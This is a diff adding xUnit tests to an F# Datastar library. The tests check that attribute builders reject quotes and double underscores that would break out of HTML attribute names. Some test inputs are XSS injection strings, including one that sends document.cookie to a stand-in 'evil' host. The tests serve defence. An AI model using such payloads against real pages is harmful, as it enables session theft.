@@ -1,5 +1,6 @@
 namespace Falco.Datastar.Tests
 
+open System
 open Falco.Datastar
 open Falco.Markup
 open FsUnit.Xunit
@@ -121,6 +122,11 @@ module DsTests =
         Ds.peek "$count"
         |> should equal "@peek(() => $count)"
 
+    [<Fact>]
+    let ``Ds.expression joins statements with a semicolon, which is what Datastar reads as the end of one`` () =
+        Ds.expression [ "$_menuOpen = !$_menuOpen"; "$_count = 0" ]
+        |> should equal "$_menuOpen = !$_menuOpen ; $_count = 0"
+
     // data-bind on custom elements and web components
 
     [<Fact>]
@@ -191,3 +197,42 @@ module DsTests =
     let ``Ds.onEvent Document listens on the document`` () =
         renderAttr (Ds.onEvent ("keydown", "$k = evt.key", [ Document ]))
         |> should equal """<div data-on:keydown__document="$k = evt.key"></div>"""
+
+    // Every part of a key goes into the name of an attribute, and Falco.Markup does not escape an attribute name.
+    // A quote in the attribute name, in the plugin name or in the name of a modifier would end the name early and could add attributes of its own.
+
+    [<Fact>]
+    let ``DsAttr refuses a plugin name that would end the attribute name early`` () =
+        let hostile = "text\" onmouseover=\"fetch('//evil/'+document.cookie)"
+        let error = Assert.Throws<ArgumentException>(fun () -> DsAttr.create { Name = hostile; Target = ValueNone; Modifiers = []; HasCaseModifier = false; Value = ValueSome "$x" } |> ignore)
+        error.Message |> should haveSubstring "attribute name"
+        error.Message |> should haveSubstring "it contains '\"'"
+
+    [<Fact>]
+    let ``DsAttr refuses a modifier name that would end the attribute name early`` () =
+        let hostile = "ifmissing\" onload=\"alert(1)"
+        let error =
+            Assert.Throws<ArgumentException>(fun () ->
+                DsAttr.start "text"
+                |> DsAttr.addModifier { Name = hostile; Tags = [] }
+                |> DsAttr.addValue "$x"
+                |> DsAttr.create
+                |> ignore)
+        error.Message |> should haveSubstring "modifier name"
+        error.Message |> should haveSubstring "it contains '\"'"
+
+    [<Fact>]
+    let ``DsAttr refuses a modifier value that would end the attribute name early`` () =
+        let error =
+            Assert.Throws<ArgumentException>(fun () ->
+                DsAttr.start "text"
+                |> DsAttr.addModifier { Name = "debounce"; Tags = [ "100ms\" x=\"" ] }
+                |> DsAttr.create
+                |> ignore)
+        error.Message |> should haveSubstring "modifier value"
+        error.Message |> should haveSubstring "it contains '\"'"
+
+    [<Fact>]
+    let ``DsAttr refuses a plugin name with a double underscore, which Datastar reads as a modifier`` () =
+        let error = Assert.Throws<ArgumentException>(fun () -> DsAttr.create { Name = "a__b"; Target = ValueNone; Modifiers = []; HasCaseModifier = false; Value = ValueSome "$x" } |> ignore)
+        error.Message |> should haveSubstring "it contains '__'"
